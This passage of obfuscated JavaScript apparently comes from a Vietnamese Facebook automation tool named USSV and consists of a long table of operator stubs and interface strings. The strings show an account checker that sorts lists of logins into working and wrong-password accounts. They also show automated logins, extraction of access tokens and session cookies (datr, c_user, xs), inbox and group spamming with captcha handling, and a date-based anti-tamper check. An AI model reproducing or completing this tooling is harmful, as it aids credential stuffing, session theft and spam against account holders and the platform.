            ussv_lang_vi_vl_pt_sp_nofr = W;
        },
        'V9X': "Không thê? tiê´n ha`nh Check vi` xa~y ra su? cô´ ! !",
        'e2l': function(W, V) {
            return W >= V;
        },
        'W9Q': ".span_thongke",
        'v2b': function(W, V) {
            return W < V;
        },
        'v6a': ".popup_menu_list.ussv_aut_check_content",
        'C5a': "imglink",
        'w1t': function(W, V) {
            return W == V;
        },
        'C7t': function(W, V) {
            return W == V;
        },
        'b8t': function(W, V) {
            return W == V;
        },
        's8X': 'Ðang nh?p th?t b?i, tài kho?n ho?c m?t kh?u không dúng.',
        'b18': function(W, V) {
            return W == V;
        },
        'T6E': function(W, V) {
            return W == V;
        },
        'C6I': "die",
        'J9v': "&data=",
        'H17': "#thong_check_total",
        'r88': function(W, V) {
            return W < V;
        },
        'v9r': "PublicApp",
        'Q56': function(W, V) {
            return W == V;
        },
        'L5': function(W, V) {
            return W == V;
        },
        'm9b': function(W, V) {
            return W == V;
        },
        'a1E': function(W, V) {
            return W == V;
        },
        'I9t': function(W, V) {
            return W == V;
        },
        'B8E': function(W, V) {
            return W !== V;
        },
        'V7l': function(W, V) {
            return W > V;
        },
        'C48': function(W, V) {
            return W <= V;
        },
        'q82': function(W, V) {
            return W == V;
        },
        'h6b': function(W, V) {
            return W == V;
        },
        'E7v': "#a_thaotac_",
        'T5Y': "https://graph.facebook.com/me?access_token=",
        'P2a': function(W, V) {
            return W - V;
        },
        'v67': "&fb_id=",
        'f9E': function(W, V) {
            return W == V;
        },
        'o2l': function(W, V) {
            return W <= V;
        },
        'o3y': "Yes",
        'W9t': function(W, V) {
            return W == V;
        },
        'S5t': function(W, V) {
            return W == V;
        },
        'M0Q': '</span> <span id="acc_fn_stt_',
        'h3E': function(W, V) {
            return W == V;
        },
        'F6r': "replace",
        'd8': function(W, V) {
            return W == V;
        },
        'F9b': function(W, V) {
            return W !== V;
        },
        'v6E': function(W, V) {
            return W == V;
        },
        'z4E': function(W, V) {
            return W == V;
        },
        'c87': "#stt_check",
        'C4Q': "#row_token_",
        'E8b': function(W, V) {
            return W !== V;
        },
        'p6Y': "null",
        'h22': function(W, V) {
            return W == V;
        },
        'l3l': function(W, V) {
            return W >= V;
        },
        'N18': function(W, V) {
            return W == V;
        },
        'S57': ".com",
        'N78': function(W, V) {
            return W == V;
        },
        'C2r': ' ',
        'q1b': function(W, V) {
            return W == V;
        },
        'r8l': function(W, V) {
            return W == V;
        },
        'u32': function(W, V) {
            return W !== V;
        },
        'U0t': function(W, V) {
            return W - V;
        },
        'y6': function(W, V) {
            return W == V;
        },
        's1a': function(W, V) {
            return W == V;
        },
        't3X': "Qu´a tri`nh Check bi? ngu`ng vi` qua´ ",
        'o0Y': "user=",
        'V68': function(W, V) {
            return W == V;
        },
        'v08': function(W, V) {
            return W !== V;
        },
        'U8t': function(W, V) {
            return W == V;
        },
        't9X': "key_play",
        'Y06': function(W, V) {
            return W == V;
        },
        'L2t': function(W, V) {
            return W == V;
        },
        'H5v': "panel_text",
        'Z8t': function(W, V) {
            return W == V;
        },
        'L5t': function(W, V) {
            return W < V;
        },
        'd2t': function(W, V) {
            return W == V;
        },
        'A2b': function(W, V) {
            return W == V;
        },
        'M66': function(W, V) {
            return W == V;
        },
        'G32': function(W, V) {
            return W == V;
        },
        'A9y': "Ðang xo´a Tin Nha´n...",
        'D62': function(W, V) {
            return W == V;
        },
        'f1Q': "&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1",
        'J8l': function(W, V) {
            return W == V;
        },
        'c08': function(W, V) {
            return W > V;
        },
        'o0r': "C1t",
        'M1E': function(W, V) {
            return W >= V;
        },
        'f4E': function(W, V) {
            return W == V;
        },
        'k87': "#uss_st_type_internet_auto_rs_div",
        'p1y': "#uss_st_spam_inbox_autocaptcha",
        'q46': function(W, V) {
            return W == V;
        },
        'y0Y': "#uss_st_spam_need_fr_inbox_l",
        'T32': function(W, V) {
            return W == V;
        },
        'q4E': function(W, V) {
            return W > V;
        },
        'v1O': "storage",
        'o5l': function(W, V) {
            return W == V;
        },
        'a6B': function(W, V) {
            return W == V;
        },
        'I8a': "rgba(252, 252, 252, 1)",
        'x1I': "setRequestHeader",
        'g2B': function(W, V) {
            return W == V;
        },
        'M08': function(W, V) {
            return W == V;
        },
        'N5': function(W, V) {
            return W == V;
        },
        'c8l': function(W, V) {
            return W === V;
        },
        'X3b': function(W, V) {
            return W == V;
        },
        'M40': "#uss_st_lancheck",
        'x4X': "getURL",
        'r90': "https://graph.facebook.com/",
        'm2r': "Group",
        'v28': function(W, V) {
            return W > V;
        },
        'g72': function(W, V) {
            return W < V;
        },
        'c8Q': "0",
        'w56': function(W, V) {
            return W == V;
        },
        'g4Y': "onreadystatechange",
        'E9t': function(W, V) {
            return W == V;
        },
        'e10': "title_sf_msg",
        'n92': function(W, V) {
            return W == V;
        },
        'A4a': function(W, V) {
            return W == V;
        },
        'p5l': function(W, V) {
            return W == V;
        },
        'v5l': function(W, V) {
            return W == V;
        },
        'T1B': function(W, V) {
            return W !== V;
        },
        'M0l': function(W, V) {
            return W == V;
        },
        'T58': function(W, V) {
            return W == V;
        },
        'J0Y': ")",
        'f17': "spaming",
        'M97': "#stop_check",
        'X60': "contents=",
        'n5r': (function(D5r) {
            return (function(J5r, z5r) {
                return (function(P5r) {
                    return {
                        f5r: P5r,
                        c5r: P5r,
                    };
                })(function(i5r) {
                    var g5r, R5r = 0;
                    for (var C5r = J5r; R5r < i5r["length"]; R5r++) {
                        var I5r = z5r(i5r, R5r);
                        g5r = R5r === 0 ? I5r : g5r ^ I5r;
                    }
                    return g5r ? C5r : !C5r;
                });
            })((function(T5r, a5r, Y5r, N5r) {
                var h5r = 29;
                return T5r(D5r, h5r) - N5r(a5r, Y5r) > h5r;
            })(parseInt, Date, (function(a5r) {
                return ('' + a5r)["substring"](1, (a5r + '')["length"] - 1);
            })('_getTime2'), function(a5r, Y5r) {
                return new a5r()[Y5r]();
            }), function(i5r, R5r) {
                var m5r = parseInt(i5r["charAt"](R5r), 16)["toString"](2);
                return m5r["charAt"](m5r["length"] - 1);
            });
        })('ecr3hcrjl'),
        'Q4Y': "=",
        'j1t': function(W, V) {
            return W == V;
        },
        't98': function(W, V) {
            return W * V;
        },
        'H6Y': "#popup_ussv_fb_tools",
        'I28': function(W, V) {
            return W < V;
        },
        'B5r': "yes",
        'J9t': function(W, V) {
            return W == V;
        },
        'o5r': "#uss_check_str",
        'X8X': "#uss_st_type_spam",
        'H4E': function(W, V) {
            return W * V;
        },
        'V4B': function(W, V) {
            return W == V;
        },
        'n7a': "#uss_st_spam_need_fr",
        'B72': function(W, V) {
            return W == V;
        },
        'D80': 'json',
        't9Y': "getDate",
        'k0E': function(W, V) {
            return W == V;
        },
        'P5O': "TxtToString",
        'f96': function(W, V) {
            return W < V;
        },
        'M80': "&__a=1",
        'F2r': "k=",
        'r47': "Z36",
        'x1t': function(W, V) {
            return W == V;
        },
        'C0E': function(W, V) {
            return W !== V;
        },
        'u88': function(W, V) {
            return W == V;
        },
        'y7t': function(W, V) {
            return W == V;
        },
        'e4t': function(W, V) {
            return W === V;
        },
        'h9O': "#thong_check_kxd",
        'W08': function(W, V) {
            return W == V;
        },
        'F6v': "#uss_st_spam_inbox_via",
        'R2a': function(W, V) {
            return W == V;
        },
        'V1b': function(W, V) {
            return W == V;
        },
        'u9t': function(W, V) {
            return W == V;
        },
        'y12': function(W, V) {
            return W == V;
        },
        'c0b': function(W, V) {
            return W == V;
        },
        'D0B': function(W, V) {
            return W == V;
        },
        'S6l': function(W, V) {
            return W === V;
        },
        'g1a': function(W, V) {
            return W <= V;
        },
        'W6I': "gr",
        'l2': function(W) {
            lang_vi_fb_parseLogin_live = W;
        },
        'D2y': '</select>',
        't1t': function(W, V) {
            return W !== V;
        },
        'E07': '0',
        'Z5': function(W, V) {
            return W == V;
        },
        'B98': function(W, V) {
            return W < V;
        },
        'g90': "#thong_check_live, #thongke_acc_live",
        'v92': function(W, V) {
            return W == V;
        },
        'e7r': "u7E",
        'C5E': function(W, V) {
            return W < V;
        },
        'j0B': function(W, V) {
            return W == V;
        },
        'h7b': function(W, V) {
            return W !== V;
        },
        'S0t': function(W, V) {
            return W == V;
        },
        'Q6t': function(W, V) {
            return W > V;
        },
        'E7O': "fb_sex",
        'R22': function(W, V) {
            return W !== V;
        },
        'o1Q': "Hide",
        'C9b': function(W, V) {
            return W == V;
        },
        'p8O': "update",
        'Y4b': function(W, V) {
            return W !== V;
        },
        'y7Y': "#div_textarea_themacc",
        'D4l': function(W, V) {
            return W == V;
        },
        'w30': "|",
        'm3b': function(W, V) {
            return W == V;
        },
        'S96': function(W, V) {
            return W == V;
        },
        'M2l': function(W, V) {
            return W < V;
        },
        'M50': "#uss_st_check_daluong",
        'L3E': function(W, V) {
            return W !== V;
        },
        'N2t': function(W, V) {
            return W == V;
        },
        'e70': "rgba(223, 3, 53, 0.52)",
        'H1r': "getMonth",
        'M57': "appendChild",
        'b78': function(W, V) {
            return W !== V;
        },
        'P5t': function(W, V) {
            return W <= V;
        },
        'a76': function(W, V) {
            return W == V;
        },
        'p58': function(W, V) {
            return W == V;
        },
        'X8B': function(W, V) {
            return W == V;
        },
        'O1l': function(W, V) {
            return W == V;
        },
        'l2E': function(W, V) {
            return W == V;
        },
        't7y': "USSV(.*?)USSV",
        'G3t': function(W, V) {
            return W !== V;
        },
        'S82': function(W, V) {
            return W <= V;
        },
        'm98': function(W, V) {
            return W !== V;
        },
        'h57': "keydown",
        'E80': 'click',
        'I0y': "1.3.5",
        'W76': function(W, V) {
            return W == V;
        },
        'm9v': "hau",
        'l5B': function(W, V) {
            return W == V;
        },
        'C3O': "css",
        'R52': function(W, V) {
            return W == V;
        },
        'z1Y': "FB_Uid",
        'l3b': function(W, V) {
            return W == V;
        },
        'U22': function(W, V) {
            return W == V;
        },
        'M6r': "fb_img_scrape",
        'k7a': "StopCheck",
        'y56': function(W, V) {
            return W == V;
        },
        'w72': function(W, V) {
            return W == V;
        },
        'd78': function(W, V) {
            return W <= V;
        },
        'A7y': "Id",
        'z68': function(W, V) {
            return W == V;
        },
        'K7X': "location",
        'B20': "msg",
        'x3b': function(W, V) {
            return W == V;
        },
        'l38': function(W, V) {
            return W == V;
        },
        'V02': function(W, V) {
            return W == V;
        },
        't0E': function(W, V) {
            return W == V;
        },
        'k3b': function(W, V) {
            return W == V;
        },
        'o7E': function(W, V) {
            return W == V;
        },
        'v5b': function(W, V) {
            return W == V;
        },
        'h4X': "Không co´ du~ liê?u phu` ho?p trong qua´ tri`nh phân ti´ch Li?ch Su? Ðang Ba`i trên tuo`ng ba?n be`...",
        'w98': function(W, V) {
            return W <= V;
        },
        'a47': '=',
        'p0b': function(W, V) {
            return W == V;
        },
        'J0b': function(W, V) {
            return W == V;
        },
        'G16': function(W, V) {
            return W == V;
        },
        's9X': "metadata",
        'G76': function(W, V) {
            return W == V;
        },
        'D6O': ".fbNubFlyoutFooter",
        'T3t': function(W, V) {
            return W == V;
        },
        'e1B': function(W, V) {
            return W == V;
        },
        'u8Q': "B?n vui lòng ki?m tra l?i th?i gian h?n gi?, USSV không th? quay l?i quá kh? d? Check tài kho?n !",
        'O5t': function(W, V) {
            return W == V;
        },
        'L9I': "&key_play=",
        'o16': function(W, V) {
            return W == V;
        },
        'Q8y': "next",
        'i76': function(W, V) {
            return W == V;
        },
        'F0v': " : ",
        'd9Q': "captcha",
        'P3E': function(W, V) {
            return W == V;
        },
        'V5t': function(W, V) {
            return W == V;
        },
        'U7l': function(W, V) {
            return W == V;
        },
        'N22': function(W, V) {
            return W !== V;
        },
        'd9E': function(W, V) {
            return W == V;
        },
        'Z1l': function(W, V) {
            return W == V;
        },
        'r4I': 'user=',
        'U82': function(W, V) {
            return W !== V;
        },
        'i2l': function(W, V) {
            return W > V;
        },
        'S0r': "#str_dom_random_username",
        'M1y': "https://graph.facebook.com/me?fields=name,birthday,link,locale,verified,gender,mobile_phone,hometown&access_token=",
        'm4Y': "#sp_can_",
        's5E': function(W, V) {
            return W == V;
        },
        'S4B': function(W, V) {
            return W == V;
        },
        'O52': function(W, V) {
            return W == V;
        },
        'y5I': '_',
        'q47': "#checking_friends_",
        'f9X': "Ta`i khoa?n ",
        'k9l': function(W, V) {
            return W == V;
        },
        'N6I': 'datr',
        'H9v': 'a11y|act|csm|fr|locale|lu|p|presence|s|datr|c_user|xs',
        'G88': function(W, V) {
            return W == V;
        },
        'R6b': function(W, V) {
            return W == V;
        },
        'r0b': function(W, V) {
            return W !== V;
        },
        'l9b': function(W, V) {
            return W == V;
        },
        'y2v': "input[name$='Login_Pwd']",
        'X7y': "#uss_st_inbox_title",
        'X9l': function(W, V) {
            return W - V;
        },
        'Q6O': "action",
        'g26': function(W, V) {
            return W == V;
        },
        'u7X': "Ðang tiê´n ha`nh lâ´y du~ liê?u...",
        'Z6l': function(W, V) {
            return W == V;
        },
        'P80': ".str_div_fb_info",
        'V3O': '#div_pnc_right_ketqua',
        'v8l': function(W, V) {
            return W == V;
        },
        'e0Q': "CheckSettingMore",
        'p87': "Token",
        'L36': function(W, V) {
            return W < V;
        },
        's12': function(W, V) {
            return W == V;
        },
        'X6t': function(W, V) {
            return W == V;
        },
        'P5Y': "div",
        'm38': function(W, V) {
            return W == V;
        },
        'e58': function(W, V) {
            return W == V;
        },
        'E58': function(W, V) {
            return W === V;
        },
        'j97': "error_inbox_captcha",
        'b9Q': "comment_id",
        'O3E': function(W, V) {
            return W == V;
        },
        'O5I': "Du~ liê?u trên ta`i khoa?n na`y chua duo?c thiê´t lâ?p, vui lo`ng tiê´n ha`nh Check truo´c khi su? du?ng ti´nh nang na`y !",
        'N2Y': "o7",
        'Z52': function(W, V) {
            return W * V;
        },
        'j7X': "graph.facebook.com/login",
        'a8a': "c3",
        'E1r': "https://m.facebook.com/login.php",
        'p6O': "encode",
        'h50': "x",
        'F06': function(W, V) {
            return W == V;
        },
        'H4B': function(W, V) {
            return W == V;
        },
        'r7X': "comment",
        'O4E': function(W, V) {
            return W == V;
        },
        'q40': "R7",
        'J5l': function(W, V) {
            return W == V;
        },
        'q2Y': "ready",
        'p2l': function(W, V) {
            return W > V;
        },
        'W6B': function(W, V) {
            return W !== V;
        },
        'v7r': "0|_|_|war|check",
        'o9O': "%0A",
        'F5y': ".list_icon",
        'Z2t': function(W, V) {
            return W == V;
        },
        'A6E': function(W, V) {
            return W == V;
        },
        'z52': function(W, V) {
            return W == V;
        },
        'c7E': function(W, V) {
            return W == V;
        },
        'm86': function(W, V) {
            return W !== V;
        },
        'k6v': "#uss_st_check_saveusskey",
        'P52': function(W, V) {
            return W == V;
        },
        'R4E': function(W, V) {
            return W == V;
        },
        'V7b': function(W, V) {
            return W == V;
        },
        'T1r': "CustomJs",
        'C00': 'Quá th?i gian dang nh?p.',
        'n3Q': "Pass",
        'N6b': function(W, V) {
            return W == V;
        },
        'd7b': function(W, V) {
            return W == V;
        },
        'k7O': ".uiBoxGray.topborder",
        'x56': function(W, V) {
            return W == V;
        },
        'S0I': "groups",
        'A4t': function(W, V) {
            return W == V;
        },
        'e4a': function(W, V) {
            return W == V;
        },
        'G9t': function(W, V) {
            return W == V;
        },
        'Y12': function(W, V) {
            return W == V;
        },
        'o7': function(W) {
            ussv_lang_vi_vl_error_tokennull = W;
        },
        'I8b': function(W, V) {
            return W == V;
        },
        'W9a': function(W, V) {
            return W == V;
        },
        'Y1a': function(W, V) {
            return W == V;
        },
        'l5E': function(W, V) {
            return W - V;
        },
        'T2O': "cookie",
        't26': function(W, V) {
            return W == V;
        },
        'U78': function(W, V) {
            return W !== V;
        },
        'M70': "v9",
        'u6X': "total_count",
        'd6b': function(W, V) {
            return W == V;
        },
        'E7': function(W) {
            ussv_lang_vi_log_cp_clear_cookie = W;
        },
        'h60': "USSV da´nh gia´ qua´ tri`nh Check cu?a ba?n râ´t cao, tuy nhiên ty? lê? Live chua duo?c cao la´m. Ðê? ca?i thiê?n qua´ tri`nh check ba?n câ`n trang bi? ca´c công cu? dê? ha?n chê´ Checkpoint, va` List acc thâ?t tô´t dê? tang ty? lê? Live nhe´ !",
        'u2b': function(W, V) {
            return W !== V;
        },
        'j0y': "&app_id=",
        'b4y': "keyCode",
        'v7v': "ussv_mabimat",
        'G66': function(W, V) {
            return W !== V;
        },
        'I7': function(W) {
            ussv_lang_vi_vl_pt_sp_h50 = W;
        },
        'U5t': function(W, V) {
            return W == V;
        },
        'X2r': "comment_id=",
        'c4a': function(W, V) {
            return W == V;
        },
        'J0Q': "facebook.com",
        'y1Y': "bind",
        'M4t': function(W, V) {
            return W !== V;
        },
        'X6v': '',
        'P1b': function(W, V) {
            return W == V;
        },
        'x9l': function(W, V) {
            return W == V;
        },
        'Q72': function(W, V) {
            return W == V;
        },
        'w5I': "remove",
        's38': function(W, V) {
            return W == V;
        },
        'C6t': function(W, V) {
            return W !== V;
        },
        'K8v': "story",
        'I1E': function(W, V) {
            return W == V;
        },
        'v0Q': "set",
        'D7': function(W) {
            ussv_lang_vi_vl_pt_sp_h70 = W;
        },
        'K9B': function(W, V) {
            return W == V;
        },
        's86': function(W, V) {
            return W == V;
        },
        'N46': function(W, V) {
            return W !== V;
        },
        'r5Q': "rsdcom",
        'C3b': function(W, V) {
            return W == V;
        },
        'y6t': function(W, V) {
            return W == V;
        },
        'p9t': function(W, V) {
            return W == V;
        },
        'T0l': function(W, V) {
            return W >= V;
        },
        'j2X': "url",
        'H3a': "Ha~y cha´c cha´n ra`ng ba?n da~ thêm ta`i khoa?n truo´c khi check chu´ ? Xin lô~i vi` su? bâ´t tiê?n na`y !",
        'q8r': "find",
        'o08': function(W, V) {
            return W == V;
        },
        'k56': function(W, V) {
            return W !== V;
        },
        't56': function(W, V) {
            return W == V;
        },
        'm77': '>',
        't0Q': "year",
        'g6': function(W, V) {
            return W == V;
        },
        'C1t': function(W, V) {
            return W !== V;
        },
        'D7X': 4000,
        'u7v': "files",
        'T1E': function(W, V) {
            return W == V;
        },
        'K22': function(W, V) {
            return W < V;
        },
        'V52': function(W, V) {
            return W === V;
        },
        'W5l': function(W, V) {
            return W !== V;
        },
        'G5l': function(W, V) {
            return W == V;
        },
        'P9I': 'Mo? tha`nh công Trang qua?n ly´ Ta`i Khoa?n',
        'O7O': 'facebook.com',
        'f5t': function(W, V) {
            return W == V;
        },
        'N4B': function(W, V) {
            return W - V;
        },
        'I60': "#addon_note_login",
        'f6l': function(W, V) {
            return W == V;
        },
        'F2y': "USSV s? ti?n hành Check khi th?i gian hi?n t?i phù h?p v?i th?i gian b?n thi?t l?p. Ð? h?y ti?n trình Check, b?n vui lòng Click H?y",
        'D72': function(W, V) {
            return W == V;
        },
        'D6': function(W, V) {
            return W == V;
        },
        'a28': function(W, V) {
            return W == V;
        },
        'G4y': "inbox",
        'e8b': function(W, V) {
            return W == V;
        },
        'X5B': function(W, V) {
            return W == V;
        },
        'Y86': function(W, V) {
            return W == V;
        },
        's5Y': "#uss_lan_checkpoint",
        'P7a': '">',
        'f0a': function(W, V) {
            return W == V;
        },
        'o1v': "Vui lo`ng Tiê´n ha`nh Spam dê? co´ thê? phân ti´ch qua´ tri`nh Spam ! ",
        'z1b': function(W, V) {
            return W == V;
        },
        'e8l': function(W, V) {
            return W == V;
        },
        'G7B': function(W, V) {
            return W == V;
        },
        'H36': function(W, V) {
            return W == V;
        },
        'Q2B': function(W, V) {
            return W == V;
        },
        'N9y': "?access_token=",
        'Y1t': function(W, V) {
            return W - V;
        },
        'v6v': "payload",
        'p0y': "#uss_lan_rs_dcom",
        'Y0v': "spam_delmsg",
        'L2': function(W) {
            lang_vi_fb_parseLogin_cp = W;
        },
        'n8r': '" style="display:none">',
        'y9O': "E7",
        'Q20': "&ggurl=",
        'k9r': "Method",
        'Q5Q': 'url()',
        'i66': function(W, V) {
            return W == V;
        },
        'j26': function(W, V) {
            return W == V;
        },
        's8Y': "#time_wait_add_group_",
        'e0b': function(W, V) {
            return W !== V;
        },
        'y2E': function(W, V) {
            return W == V;
        },
        'B5E': function(W, V) {
            return W == V;
        },
        'F6': function(W, V) {
            return W !== V;
        },
        'd0a': function(W, V) {
            return W >= V;
        },
        'y98': function(W, V) {
            return W == V;
        },
        'E4a': function(W, V) {
            return W >= V;
        },
        'H0a': function(W, V) {
            return W == V;
        },
        'K46': function(W, V) {
            return W !== V;
        },
        'o28': function(W, V) {
            return W !== V;
        },
        'v0O': "GET",
        'j2Y': '    <div class="clearfix">',
        'e08': function(W, V) {
            return W == V;
        },
        'p4y': "log",
        'x1v': "Kiê?m Ði?nh Nô?i Dung: Yes",
        'z90': 'GetCookie',
        'l86': function(W, V) {
            return W !== V;
        },
        'W6E': function(W, V) {
            return W == V;
        },
        'R4r': "show",
        'T9t': function(W, V) {
            return W == V;
        },
        'm3l': function(W, V) {
            return W == V;
        },
        'x5E': function(W, V) {
            return W == V;
        },
        'W1I': "hj",
        'T2': function(W) {
            lang_vi_st_check_note_stt = W;
        },
        'w4l': function(W, V) {
            return W == V;
        },
        'm2X': "input[name$='texttpLoginBtn']",
        't62': function(W, V) {
            return W === V;
        },
        'r7Q': "-",
        'D47': "L9",
        'P6b': function(W, V) {
            return W == V;
        },
        'p66': function(W, V) {
            return W < V;
        },
        'g3b': function(W, V) {
            return W >= V;
        },
        'z50': "sync",
        'z0r': "message_id",
        'L7a': "Tiê´n trinh Spam trên ta`i khoa?n na`y bi? Ngan Cha?n vi` theo thiê´t lâ?p tu`y cho?n cu?a ba?n !",
        'L0X': "SafeString",
        'Q2X': "USSVSAFE",
        'l1t': function(W, V) {
            return W !== V;
        },
        'K1v': "color",
        'h8Q': "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
        'B3Y': "Data",
        'G6y': "name",
        'z6b': function(W, V) {
            return W == V;
        },
        'g4v': "toDataURL",
        'f2I': "random",
        'k2E': function(W, V) {
            return W == V;
        },
        'q0t': function(W, V) {
            return W - V;
        },
        'l8B': function(W, V) {
            return W == V;
        },
        'E88': function(W, V) {
            return W == V;
        },
        'I16': function(W, V) {
            return W == V;
        },
        't9b': function(W, V) {
            return W < V;
        },
        'g9l': function(W, V) {
            return W == V;
        },
        'E4t': function(W, V) {
            return W < V;
        },
        'C9l': function(W, V) {
            return W < V;
        },
        'c7v': "trigger",
        'a5a': '</div>	',
        'w8Q': "ThongBao",
        'y3b': function(W, V) {
            return W == V;
        },
        'j6': function(W, V) {
            return W !== V;
        },
        'T5b': function(W, V) {
            return W == V;
        },
        'j62': function(W, V) {
            return W !== V;
        },
        'K36': function(W, V) {
            return W < V;
        },
        'z78': function(W, V) {
            return W == V;
        },
        'O1X': "clearCookie",
        'i4a': function(W, V) {
            return W == V;
        },
        'a8l': function(W, V) {
            return W == V;
        },
        'g62': function(W, V) {
            return W == V;
        },
        'K6l': function(W, V) {
            return W == V;
        },
        'q1l': function(W, V) {
            return W == V;
        },
        'k5B': function(W, V) {
            return W > V;
        },
        'g1v': ".txt",
        'O02': function(W, V) {
            return W == V;
        },
        'Q5I': "Warring: Ba?n câ`n pha?i diê`n Email va` Mâ?t Khâ?u cho ta`i khoa?n na`y mo´i co´ thê? tiê´n ha`nh thao ta´c.(Ta`i khoa?n Ngoa?i Vi)",
        'Q2E': function(W, V) {
            return W == V;
        },
        'L6b': function(W, V) {
            return W == V;
        },
        'd2a': function(W, V) {
            return W == V;
        },
        'B2O': "#USS_ST_Div_CustomJs",
        'f1b': function(W, V) {
            return W == V;
        },
        'w86': function(W, V) {
            return W == V;
        },
        'l26': function(W, V) {
            return W == V;
        },
        'v2l': function(W, V) {
            return W <= V;
        },
        'R96': function(W, V) {
            return W !== V;
        },
        'w9O': '</div>',
        'X2B': function(W, V) {
            return W == V;
        },
        'S8': function(W, V) {
            return W == V;
        },
        'F5O': "--x",
        'k5E': function(W, V) {
            return W < V;
        },
        't06': function(W, V) {
            return W - V;
        },
        'n9t': function(W, V) {
            return W !== V;
        },
        'u6B': function(W, V) {
            return W - V;
        },
        'j2E': function(W, V) {
            return W == V;
        },
        'y2X': "https://www.facebook.com/v1.0/dialog/oauth/read",
        'f7l': function(W, V) {
            return W >= V;
        },
        'M8v': "t",
        'E42': function(W, V) {
            return W == V;
        },
        'j7v': "#GroupCore_spam_TypeUSS_URL",
        'x12': function(W, V) {
            return W == V;
        },
        'p3Q': "append",
        'Q12': function(W, V) {
            return W !== V;
        },
        'f78': function(W, V) {
            return W == V;
        },
        'k8B': function(W, V) {
            return W == V;
        },
        'p9a': "B?n dã h?y h?n gi? Check, vui lòng thi?t l?p l?i !",
        'W77': ".ussv_log_panel.setting, .setting.btn",
        'G7O': "VPNHola",
        'y3Q': 5000,
        'i8b': function(W, V) {
            return W == V;
        },
        's9l': function(W, V) {
            return W >= V;
        },
        'F7a': "#uss_st_auto_keomem_speed",
        'D87': "info",
        'c16': function(W, V) {
            return W == V;
        },
        'f2a': function(W, V) {
            return W < V;
        },
        'N7': function(W) {
            ussv_lang_vi_vl_pt_sp_h60 = W;
        },
        'C6a': "hidden",
        'T08': function(W, V) {
            return W == V;
        },
        'O0t': function(W, V) {
            return W == V;
        },
        'f1l': function(W, V) {
            return W == V;
        },
        'M1B': function(W, V) {
            return W >= V;
        },
        'B1t': function(W, V) {
            return W !== V;
        },
        'C38': function(W, V) {
            return W == V;
        },
        'j4X': '" title="Ðóng">Ðóng</a>',
        'v4X': "stringify",
        'F1t': function(W, V) {
            return W == V;
        },
        'I5b': function(W, V) {
            return W <= V;
        },
        'n5b': function(W, V) {
            return W == V;
        },
        'V2a': function(W, V) {
            return W <= V;
        },
        'H9B': function(W, V) {
            return W == V;
        },
        'l1a': function(W, V) {
            return W == V;
        },
        'S3E': function(W, V) {
            return W == V;
        },
        'm5I': "parseAut",
        'h4E': function(W, V) {
            return W == V;
        },
        'm1t': function(W, V) {
            return W == V;
        },
        'd96': function(W, V) {
            return W == V;
        },
        'F3a': "USSVMSG",
        'o0Q': "#GroupCore_spam_loc_listgroup",
        'G0Q': '<img style="margin-top: 5px;width:12px" src="https://ussv.net/themes/img/load_stt.gif">',
        'a08': function(W, V) {
            return W == V;
        },
        'A67': "#GroupCore_spam_sl_Method_post",
        'w3y': "#sp_fb_friends_",
        'a4a': function(W, V) {
            return W == V;
        },
        'K4B': function(W, V) {
            return W == V;
        },
        'n4a': function(W, V) {
            return W == V;
        },
        'D5O': "Ta`i khoa?n sai pass nhiê`u hon so vo´i ta`i khoa?n Live, USSV da´nh gia´ qua´ tri`nh Check na`y không cao, Ba?n vui lo`ng kiê?m tra la?i List Acc",
        'J5b': function(W, V) {
            return W === V;
        },
        'X1a': function(W, V) {
            return W !== V;
        },
        'f8': function(W, V) {
            return W == V;
        },
        'd4E': function(W, V) {
            return W !== V;
        },
        'O78': function(W, V) {
            return W <= V;
        },
        'F1Y': "#uss_st_id_ppa",
        'M8y': '<tr class="info_table ',
        'C86': function(W, V) {
            return W == V;
        },
        'm9l': function(W, V) {
            return W <= V;
        },
        'Q4l': function(W, V) {
            return W == V;
        },
        'R46': function(W, V) {
            return W === V;
        },
        'm5B': function(W, V) {
            return W !== V;
        },
        'H3E': function(W, V) {
            return W == V;
        },
        'o2b': function(W, V) {
            return W <= V;
        },
        'Q7y': "++",
        'x0E': function(W, V) {
            return W == V;
        },
        'A5l': function(W, V) {
            return W == V;
        },
        'n2l': function(W, V) {
            return W == V;
        },
        'w6r': "URL",
        'R1Q': '<img style="margin-top: 5px;" src="https://ussv.net/themes/img/load_stt.gif">',
        'g6O': "Gu?i yêu câ`u kiê?m tra thông tin ta`i khoa?n ",
        'V18': function(W, V) {
            return W <= V;
        },
        'J80': "#uss_st_check_str",
        'C3l': function(W, V) {
            return W == V;
        },
        'u92': function(W, V) {
            return W >= V;
        },
        'D98': function(W, V) {
            return W <= V;
        },
        'B38': function(W, V) {
            return W == V;
        },
        'l56': function(W, V) {
            return W == V;
        },
        'y0E': function(W, V) {
            return W == V;
        },
        'm2O': "#text_string_spam",
        'O5': function(W, V) {
            return W == V;
        },
        'N52': function(W, V) {
            return W !== V;
        },
        't3b': function(W, V) {
            return W == V;
        },
        'e8Q': "3",
        'h7r': "#div_pnc_right_check",
        'O6b': function(W, V) {
            return W == V;
        },
        'G4t': function(W, V) {
            return W == V;
        },
        'J1E': function(W, V) {
            return W >= V;
        },
        'T7E': function(W, V) {
            return W * V;
        },
        'q2t': function(W, V) {
            return W == V;
        },
        'E7B': function(W, V) {
            return W == V;
        },
        'V0y': "https://www.facebook.com/",
        's98': function(W, V) {
            return W !== V;
        },
        'o58': function(W, V) {
            return W == V;
        },
        'D6t': function(W, V) {
            return W >= V;
        },
        'b22': function(W, V) {
            return W == V;
        },
        'C98': function(W, V) {
            return W >= V;
        },
        'E6E': function(W, V) {
            return W !== V;
        },
        'x1a': function(W, V) {
            return W < V;
        },
        'w0Y': " Ta`i khoa?n bi? Sai pass",
        'H0t': function(W, V) {
            return W == V;
        },
        'c4X': "ussv_sl_auto_check",
        'N4E': function(W, V) {
            return W <= V;
        },
        'q9E': function(W, V) {
            return W == V;
        },
        'Y0y': "#uss_st_auto_keomem_id",
        'k98': function(W, V) {
            return W !== V;
        },
        'A76': function(W, V) {
            return W == V;
        },
        'H4I': "fail",
        'C62': function(W, V) {
            return W == V;
        },
        'V0t': function(W, V) {
            return W == V;
        },
        'N5I': "datr",
        'W2l': function(W, V) {
            return W >= V;
        },
        'Z4E': function(W, V) {
            return W == V;
        },
        'v1E': function(W, V) {
            return W == V;
        },
        'n76': function(W, V) {
            return W !== V;
        },
        'l9Q': 'Không co´ du~ liê?u dê? lo?c. Vui lo`ng thêm va`o khung lo?c !',
